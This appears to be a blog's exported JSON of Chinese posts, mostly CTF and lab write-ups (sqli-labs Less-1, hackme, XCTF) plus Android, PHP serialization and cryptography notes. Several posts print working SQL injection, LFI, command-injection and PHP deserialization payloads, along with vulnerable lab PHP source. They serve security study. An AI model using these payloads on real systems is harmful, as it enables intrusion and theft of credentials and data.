新建drawable文件目录，命名为drawable-xxhdpi; (注意：1. 若新建后未显示文件夹，则将文件模式改为Project； 图片用png格式，jpg格式图片不能设为透明； 新建的drawable-xxhdpi文件应该位于res目录下与drawable目录等级平行，否则当我们引用图标时会报错，不能检索；) 创建login_Button，命名为btn_login 可以调用之前创建的按压背景效果； 给login_Button添加点击事件监听 在EditTextActivity.java中注册，找id，设置点击事件（与之前一样）； （tip:当包不存在时，同时点击Alt+Enter可自动添加包） 此处给login_Button设置一个简单的消息提示框，使用Toast方法； 尝试给EditText设置一个输入文字动态监听 同样在EditTextActivity.java中注册，找id，设置动态变化监听； 因为监听形式不一样，此处使用addTextChangedListener方法； 123456789101112131415161718mEtUserName=findViewById(R.id.et_1); mEtUserName.addTextChangedListener(new TextWatcher() &#123; @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) &#123;//文字改变之前 &#125; @Override public void onTextChanged(CharSequence s, int start, int before, int count) &#123;//文字改变时 Log.d(\"edittext\",s.toString()); &#125; @Override public void afterTextChanged(Editable s) &#123;//文字改变之后 &#125; &#125;); 完整代码： https://download.csdn.net/download/qq_40638006/12369102 +++","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-1","slug":"sqli-labs闯关记录","date":"2020-02-19T08:45:57.000Z","updated":"2020-02-24T13:24:47.636Z","comments":true,"path":"2020/02/19/sqli-labs闯关记录/","link":"","permalink":"https://singlemindedt.github.io/2020/02/19/sqli-labs闯关记录/","excerpt":"","text":"[TOC] Page-1(Basic Challenges) Less-1（get方式-基于单引号-string型）根据页面提示： 1Please input the ID as parameter with numeric value 尝试通过get方式输入ID和数值参数：[3]:(3)可以看到给出了相应的login name 和password;再添加一个单引号看看： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 得到了报错信息，说明数据库将我们所输入的“ ‘ ”当作了SQL语句的一部分处理了 ,单引号未被过滤产生不匹配错误 ，那么就可以以此闭合前面内容，恶意补充后面内容达到SQL注入。 此时大致可以猜测出查询语句： 12select * from users where id='$id' LIMIT 0,1//limit 0，1:只显示第一项 再确认一下我们的想法，查询语句是否被执行：1: (4) 可以看到确实被执行了； 此时，输入–+将SQL后面的语句注释掉，页面回显正常，证明是单引号字符型注入；1: (5) 注意：– （–空格）在SQL内表示注释，在URL中，浏览器会在发送请求的时候把URL末尾的空格舍去，用–+代替时，URL被URL编码后会变为空格（?id=2后的单引号可以不写）； ==接下来按流程猜解数据库内容：== 猜解数据库表列数 order by： 可以看到order by 4页面回显报错，order by 3页面回显正常，说明该表一共有3列； 判断数据显示位 通过Payload：?id=0’ union select 1,2,3 –+ 可以看到有2，3两个显示位； 使用联合查询，即union select查询的前提即为页面有显示位 注意：id需改为数据库中不存在的值，一般用-1或0（由于程序在显示数据时通常只会取结果中的第一行数据，查看本题源码，可以看到mysql_fetch_array（）只被调用了一次，而mysql_fetch_array()函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。此时只需让第1位的查询结果为空，即union左边的select命令查询结果为空，那么union右边的查询结果就成为了唯一可打印行）； 关于显示位的补充： 当我们通过order by 知道了相关表的列数为3，再使用union select 1,2,3 –+查看显示位，回显页面只显示了2，3，即说明该页面只允许显示第2，3位，不显示其他列的信息。而此时我们查询数据库信息就只能通过这两个显示位，union select 查询需要保证字段数一致，不足的补充数字（MySQL）或null。第一位不显示，所以将要查询的语句写在2，3位上便可得到回显。 利用显示位爆破数据库版本 ?id=-1’ union select 1,version(),3 –+ 利用显示位爆破数据库名 ?id=-1’ union select 1,2,database() –+ 得到当前数据库名为security； 查询所有数据库名： ?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 补充：information_schema:数据库是MySQL自带的，它提供了访问数据库元数据的方式。即信息数据库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。是一个虚拟数据库，物理上并不存在。 schemata表:具有数据库中的库的信息，详细记录了某个库的名称，默认编码，排序规则。 字段 表示 schema_name 数据库名 default_character_set_name 数据库编码 default_collation_name 数据库排序规则 1: (11) 得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test； 利用显示位爆破表名，此处我们查security数据库中的表名 方法1(逐个列出表名) ?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 –+ 注意：查询information_schema中的信息时，使用where语句，那个值不能直接用字母，要用单引号包裹或者用其十六进制表示，数值类型的就不用单引号了。 1security的十六进制转换是：0x7365637572697479 可看到，该页面只回显了一个表，我们可以使用limit来依次列举： ?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0，1–+ [17]:(17) 方法2我们直接使用 group_concat函数，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 ?id=-1’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+ 得到3个表，分别为：emails,referers,uagents,users； 利用显示位爆破列名，此处我们查询users表里的列 ?id=-1’union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+ 得到13个列，分别为：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,password； 利用显示位爆破字段，此处我们查询users表中username和password ?id=-1’union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)–+ 查询其他数据库内容基本同上，此处不再赘述。 查看源码： 可以看到，我们所猜测的查询语句正确; 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variables if(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-1","slug":"sqli-labs-Page-1-Less-1","date":"2020-02-19T08:45:57.000Z","updated":"2020-08-04T08:12:55.359Z","comments":true,"path":"2020/02/19/sqli-labs-Page-1-Less-1/","link":"","permalink":"https://singlemindedt.github.io/2020/02/19/sqli-labs-Page-1-Less-1/","excerpt":"","text":"[TOC] Page-1(Basic Challenges) Less-1（GET方式-基于单引号-string型）根据页面提示： 1Please input the ID as parameter with numeric value 尝试通过get方式输入ID和数值参数：[3]:(3)可以看到给出了相应的login name 和password; 再添加一个单引号看看： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 得到了报错信息，说明数据库将我们所输入的“ ‘ ”当作了SQL语句的一部分处理了 ,单引号未被过滤产生不匹配错误 ，那么就可以以此闭合前面内容，恶意补充后面内容达到SQL注入。 此时大致可以猜测出查询语句： 12select * from users where id='$id' LIMIT 0,1//limit 0，1:只显示第一项 再确认一下我们的想法，查询语句是否被执行：1: (4) 可以看到确实被执行了； 此时，输入–+将SQL后面的语句注释掉，页面回显正常，证明是单引号字符型注入；1: (5) 注意：– （–空格）在SQL内表示注释，在URL中，浏览器会在发送请求的时候把URL末尾的空格舍去，用–+代替时，URL被URL编码后会变为空格（?id=2后的单引号可以不写）； ==接下来按流程猜解数据库内容：== 猜解数据库表列数 order by： *order by会对表进行排序 可以看到order by 4页面回显报错，order by 3页面回显正常，说明该表一共有3列； 判断数据显示位 通过Payload：?id=0’ union select 1,2,3 –+ 可以看到有2，3两个显示位； 使用联合查询，即union select查询的前提即为页面有显示位 注意：id需改为数据库中不存在的值，一般用-1或0（由于程序在显示数据时通常只会取结果中的第一行数据，查看本题源码，可以看到mysql_fetch_array（）只被调用了一次，而mysql_fetch_array()函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。此时只需让第1位的查询结果为空，即union左边的select命令查询结果为空，那么union右边的查询结果就成为了唯一可打印行）； 关于显示位的补充： 当我们通过order by 知道了相关表的列数为3，再使用union select 1,2,3 –+查看显示位，回显页面只显示了2，3，即说明该页面只允许显示第2，3位，不显示其他列的信息。而此时我们查询数据库信息就只能通过这两个显示位，union select 查询需要保证字段数一致，不足的补充数字（MySQL）或null。第一位不显示，所以将要查询的语句写在2，3位上便可得到回显。 利用显示位爆破数据库版本 ?id=-1’ union select 1,version(),3 –+ 利用显示位爆破数据库名 ?id=-1’ union select 1,2,database() –+ 得到当前数据库名为security； 查询所有数据库名： ?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 补充： information_schema:数据库是MySQL自带的，它提供了访问数据库元数据的方式。即信息数据库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。是一个虚拟数据库，物理上并不存在。 schemata表:具有数据库中的库的信息，详细记录了某个库的名称，默认编码，排序规则。 字段 表示 schema_name 数据库名 default_character_set_name 数据库编码 default_collation_name 数据库排序规则 1: (11) 得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test； 利用显示位爆破表名，此处我们查security数据库中的表名 方法1(逐个列出表名) ?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 –+ information_schema.tables存储了数据表的详细元数据信息常用字段 字段 表示 table_schema 数据库名 table_name 数据表名 engine 存储引擎 data_length 表的大小（单位字节） table_rows 表的行数 row_format 查看数据表是否压缩过 index_length 表的索引的大小（字节） 注意：查询information_schema中的信息时，使用where语句，那个值不能直接用字母，要用单引号包裹或者用其十六进制表示，数值类型的就不用单引号了。 1security的十六进制转换是：0x7365637572697479 可看到，该页面只回显了一个表，我们可以使用limit来依次列举： ?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0，1–+ [17]:(17) 方法2我们直接使用 group_concat函数，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 ?id=-1’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+ 得到3个表，分别为：emails,referers,uagents,users； 利用显示位爆破列名，此处我们查询users表里的列 ?id=-1’union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+ 得到13个列，分别为：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,password； 利用显示位爆破字段，此处我们查询users表中username和password ?id=-1’union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)–+ 查询其他数据库内容基本同上，此处不再赘述。 查看源码： 可以看到，我们所猜测的查询语句正确; 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variables if(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"Magic Methods（魔术函数）","slug":"Magic函数","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-13T07:57:13.177Z","comments":true,"path":"2020/02/13/Magic函数/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/Magic函数/","excerpt":"","text":"_construct()：构造函数，实列创建时被调用； _destruction()：析构函数，在实例被销毁时被调用； _toString()：对象被当作字符串对待时使用； _sleep()：序列化对象之前调用 _wakeup()：反序列化之前调用 _call()：调用对象不存在时使用；（为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 _call() 方法来避免。该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。）_get()：通过它可以在对象的外部获取私有成员属性的值；相关文献","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"unserialize3","slug":"unserialize3","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-25T14:29:30.815Z","comments":true,"path":"2020/02/13/unserialize3/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/unserialize3/","excerpt":"","text":"根据题目及下面的代码：定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变量序列化。根据？code= 猜测可能为将序列化结果输入在?code=后POST请求； 12345678910&lt;?phpclass xctf&#123; public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;&#125;$a=new xctf();print(serialize($a));?&gt; 运行结果: 1O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125; 将此结构键入，会得到“bad requests”，并推出脚本,即执行了_wakeup()。因此应想办法绕过_wakeup();wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，对象属性个数的值大于真实个数的属性时，则不会执行wakeup()函数payload: 1http://111.198.29.45:30964/?code=O:4:%22xctf%22:3:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;即只需要将属性改为大于现属性数即可； 得到结果： 1the answer is : cyberpeace&#123;4ca0babcfe2c461d7b7dafca84b009bb&#125; 关于PHP序列化","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://singlemindedt.github.io/tags/攻防世界/"}]},{"title":"PHP序列化与反序列化","slug":"PHP序列化与发序列化","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-21T09:54:34.954Z","comments":true,"path":"2020/02/13/PHP序列化与发序列化/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/PHP序列化与发序列化/","excerpt":"","text":"序列化serialize（）是将程序中对象的状态信息转换为可存储形式的过程（一般为字符串）例1(数组变量)： 12345&lt;?php$arr = array('name', 'age', 'gender');$serialized_data = serialize($arr);echo $serialized_data;?&gt; 运行结果： 1a:3:&#123;i:0;s:4:\"name\";i:1;s:3:\"age\";i:2;s:6:\"gender\";&#125; 其中各字符含义：a:表示数据类型，此处为array；a:3中的3表示数组元素的个数（name,age,gender）；i:表示整型int;i:0中的0：表示数组元素的下标（序）；s:表示string（数组值的类型)；s:4中的4：表示数组值的长度； 123456不同数据类型：&lt;?php$arr = array('name', 'age', 66,233);$serialized_data = serialize($arr);echo $serialized_data;?&gt; 运行结果： 1a:4:&#123;i:0;s:4:\"name\";i:1;s:3:\"age\";i:2;i:66;i:3;i:233;&#125; 例2（对象） 123456789101112131415&lt;?phpclass man&#123; public $name; public $age; public $gender; function __construct($name,$age,$gender)&#123; //_construct：创建对象时初始化 $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125;&#125;$man=new man('Alice',20,'female');var_dump(serialize($man));?&gt; 运行结果： 1string(78) \"O:3:\"man\":3:&#123;s:4:\"name\";s:5:\"Alice\";s:3:\"age\";i:20;s:6:\"gender\";s:6:\"female\";&#125;\" 下面是一个例子，给出了相关格式字符的含义： 1234567891011121314- test类中定义了三个属性（private：$flag、protected:$test、public:$test1）两个方法(set_flag()给私有属性flag赋值、get_flag()获取私有属性flag);- $object=new test(); //创建对象- $object-&gt;set_flag('Active'); //创建的对象调用set_flag()方法，对flag赋值- $data=serialize($object); //对该对象序列化- 序列化时只序列化属性,不序列化方法； - testflag(属性名，私有属性只属于test类，所以在前面加上了test类名，后跟属性名flag； - php里默认在testflag首尾分别加了\\0，即\\0testflag\\0，所以长度为10；)- $flag的值本来是“Inactive”，通过$obiect-&gt;set_flag('Active')改为了'Active'所以属性值为6个字符长度； - 受保护的属性即protected，在其属性名前要加‘*’，即*test； 反序列化unserialize（）是将序列化的数据反向重新构建为php中原数据类型和结构。数组变量 12345678&lt;?php$arr = array('name', 'age', 66,233);$serialized_data = serialize($arr);#echo $serialized_data;$unserialized_data = unserialize($serialized_data);#print_r($unserialized_data);#print_r() 函数用于打印变量，以更容易理解的形式展示。 var_dump($unserialized_data);#var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。?&gt; 运行结果： 12345678910array(4) &#123; [0]=&gt; string(4) \"name\" [1]=&gt; string(3) \"age\" [2]=&gt; int(66) [3]=&gt; int(233)&#125; 对象 1234567891011121314151617&lt;?phpclass man&#123; public $name; public $age; public $gender; function __construct($name,$age,$gender)&#123; //_construct：创建对象时初始化 $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125;&#125;#$man=new man('Alice',20,'female');#var_dump(serialize($man));$man='O:3:\"man\":3:&#123;s:4:\"name\";s:5:\"Alice\";s:3:\"age\";i:20;s:6:\"gender\";s:6:\"female\";&#125;';var_dump(unserialize($man));?&gt; 运行结果： 12345678object(man)#1 (3) &#123; [\"name\"]=&gt; string(5) \"Alice\" [\"age\"]=&gt; int(20) [\"gender\"]=&gt; string(6) \"female\"&#125; 反序列化漏洞需要满足两个条件： PHP中有可以利用的类并且类中有可利用的magic函数以’__’开头 unserialize()函数的参数可控（则可以传入构造的字符串实现攻击） 关于magic Methods（魔术函数） 相关题目unserialize3","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"新年打卡","slug":"2020-1-1-diary","date":"2020-01-01T00:00:00.000Z","updated":"2020-01-01T00:21:46.862Z","comments":true,"path":"2020/01/01/2020-1-1-diary/","link":"","permalink":"https://singlemindedt.github.io/2020/01/01/2020-1-1-diary/","excerpt":"","text":"大清早各种刷，然后自己也想纪念一下下😂不知不觉一年又过去了，回顾这一年，似乎挺浪233，……e,回来再补！先复习先复习🏃","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"Diary","slug":"Diary","permalink":"https://singlemindedt.github.io/tags/Diary/"}]},{"title":"cryptography","slug":"cryptography","date":"2019-12-31T01:22:54.000Z","updated":"2020-01-01T05:15:46.014Z","comments":true,"path":"2019/12/31/cryptography/","link":"","permalink":"https://singlemindedt.github.io/2019/12/31/cryptography/","excerpt":"","text":"科克霍夫原则：密码系统的安全性不应该取决于不易改变的算法，而应取决于可随时改变的密钥. 密码体制的分类： §对称**密码体制**•序列密码(流密码)•分组密码§公钥密**码体制/非对称密码体制**","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hackme","slug":"hackme","date":"2019-12-28T16:00:00.000Z","updated":"2019-12-30T09:26:10.149Z","comments":true,"path":"2019/12/29/hackme/","link":"","permalink":"https://singlemindedt.github.io/2019/12/29/hackme/","excerpt":"","text":"[TOC] hackme MiscFlag直接提交描述即可； Corgi can fly实际操作：提示使用stegsolve,得到二维码，扫描得到flag Television实际操作：将图片拖入winhex,搜索关键字flag Meow实际操作：利用foremost meow.png提取，得到一个png和一个zip 打开zip里面有加密的flag还有一张png, 仔细观察可以发现两个压缩包内png的crc32 值一样. 故用明文攻击，可以使用Advanced Zip Password Recovery来进行破解；这里我们用pkcrack: 原理：ZIP明文攻击就是利用已知文件找加密密钥，利用密钥来解锁其它加密文件，因为ZIP压缩包里的所有文件都是使用同一个加密密钥来加密的。 执行如下命令： Where is flag问题分析：给出一串字符： Flag应该就在这里面，提示正则：cat flag |grep -oP “FLAG{[0-9a-zA-Z]+}” 得到flag。 Encoder问题描述：Can you decode this?下载解压得到 encoder.py 和 flag.enc； 12345678910111213141516171819202122232425262728import randomimport stringdef rot13(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.uppercase[13:] + string.uppercase[:13] + string.lowercase[13:] + string.lowercase[:13]))def base64(s): return ''.join(s.encode('base64').split())def hex(s): return s.encode('hex')def upsidedown(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.lowercase + string.uppercase))flag = 'FLAG&#123;.....................&#125;' # try to recover flagE = (rot13, base64, hex, upsidedown)for i in range(random.randint(30, 50)): print i c = random.randint(0, len(E) - 1) flag = '%d%s' % (c, E[c](flag))open('flag.enc', 'w').write(flag) 可以明显看到c的值就在密文开头： 123456789101112131415161718192021222324252627282930from binascii import unhexlifyfrom base64 import b64decodeimport stringdef unrot13(s): return s.translate(str.maketrans(string.ascii_uppercase[13:] + string.ascii_uppercase[:13] + string.ascii_lowercase[13:] + string.ascii_lowercase[:13], string.ascii_uppercase + string.ascii_lowercase))def unupsidedown(s): return s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase, string.ascii_uppercase + string.ascii_lowercase))def unbase64(s): return b64decode(s).decode()def unhex(s): return unhexlify(s).decode()with open('./flag.enc') as f: data = f.read()E = (unrot13, unbase64, unhex, unupsidedown)for i in range(50): c, data = int(data[0]), data[1:] data = E[c](data) if data.startswith('FLAG'): print(data) break 运算结果如下，得到flag： Pusheen.txt问题描述：1Do you think pusheen is cute? 下载解压得到 pusheen.txt, 里面是一堆不可名状的字符画字符两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag (白为0，黑为1，转化为ascll) Web hide and seek问题描述：1Can you see me? I'm so close to you but you can't see me. 实际操作：查看源码： 或者直接查看控制台（Console）里面有张二维码，扫一下得到flag此处做一标记orz，扫二维码的确得到了flag，但是不是这一题的hhhhh…,提交发现是homepage的。 Guestbook问题描述：1This guestbook sucks. sqlmap is your friend. 实际操作： 提示用sqlmap，就是sql注入了，手动注入一下：1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() 看到flag表 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag 查询所有数据 LFI知识补充： php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：readfile(“php://filter/read=convert.base64-encode/resource=php://input”); 实际操作：此题url为：https://hackme.inndy.tw/lfi/?page=pages/index结合题目提示，应该为读文件； 1读：https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag 得到一串base64解码得到：Can you read the flag?继续读config.php 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config 得到base64解密得到flag Homepage已解决，见第一题； Ping 源码给出，目的是对这个命令注入 ping -c 1 “{$ip}” 2&gt;&amp;1黑名单未过滤反引号，尝试?ip=ls,得到： Cat被过滤，可以尝试用tac倒着显示，flag也被过滤，使用通配符模糊匹配一下： 1?ip='tac f*' 得到flag。 scoreboard没啥思路，审查元素查找关键字flag，在响应头里发现flag login as admin 0 Sql注入，提示利用guest登陆（guest，中文意思是客人，网络是指计算机的来宾账户。与“Administrator”和“User”不同的，通常这个帐户没有修改系统设置和进行安装程序的权限，也没有创建修改任何文档的权限，只能是读取计算机系统信息和文件。来宾帐户可提供若干与安全性和网络共享相关的特殊功能。） 实际操作： 查看网页源码，可以看到直接返回了debug信息，含有完整的SQL语句： 查看给出的源码，发现过滤了’，将’转为/’，这里我们再添加一个转义符，把它添加的转义符转义了。 构造payload：1user=admin\\’||1=1#;password=0 提示身份为guest，即第一个用户不是admin； 1构造：user=admin\\’||1=1 limit 1,1#；得到flag login as admin 0.1题目分析：此题和上题用的是同一个数据库，这次要在库里找flag2； 实际操作： 确定列：1user=admin\\' union select 1,2,3,4#&amp;password=0 正常回显了2，固有四列； 表名1User=admin \\' union select 1,concat(table_name),3,4 from information_schema.tables where table_schema=database() 得到表名：h1dden_f14g 1User=admin \\' union select 1,concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=0x68316464656e5f66313467 # //这里有一点就是在逗号被过滤的情况下这里转义会导致sql查询出错，所以我们可以直接将表名进行ASCII的八进制编码，前面加上0x，就可以在sql中正常查询返回the_f14g 1name=admin \\' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4 # 得到flag。 login as admin 1查看源码，发现和 login as admin 0差不多，过滤了空格；用/**/ 代替空格 1user=admin\\'union/**/select/**/1,2,3,4# 得到flag。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"hackme","slug":"CTF/hackme","permalink":"https://singlemindedt.github.io/categories/CTF/hackme/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"}]},{"title":"攻防世界-Web","slug":"攻防世界-Web","date":"2019-12-25T14:49:02.000Z","updated":"2019-12-30T09:41:06.814Z","comments":true,"path":"2019/12/25/攻防世界-Web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/25/攻防世界-Web/","excerpt":"","text":"目录 [TOC] 攻防世界新手练习区view_source题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。打开链接如下： 方法1试试右键的确不管用了，直接F12，找到flag 方法2另外还可以通过view-source：url查看源代码： 方法3其实还可以禁用Js代码，这样右键就可以用了： get_post题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 知识补充：两种 HTTP 请求方法：GET 和 POST在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 12345POST。&#123;GET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc 实际操作：打开网址，得到如下要求 &lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;在url后添加/？a=1即可发送get请求。 利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。 关于GET 和 POST：https://www.cnblogs.com/williamjie/p/9099940.html Robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 知识补充： robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。【https://blog.csdn.net/qq_40491569/article/details/83473703】 实际操作：打开网页空白； 在题URL后输入/robots.txt即： http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag. Backup题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 知识补充备份文件: bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本） 实际操作试着在index.php后加.bak得到index.php.bak的备份文件，打开得到flag Cookie知识补充： Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行，也不能成为病毒，所以它对你基本无害。cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页; 当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。 实际操作：利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php” 根据提示信息，在URL后加上”/cookie.php”即http://111.198.29.45:47420/cookie.php 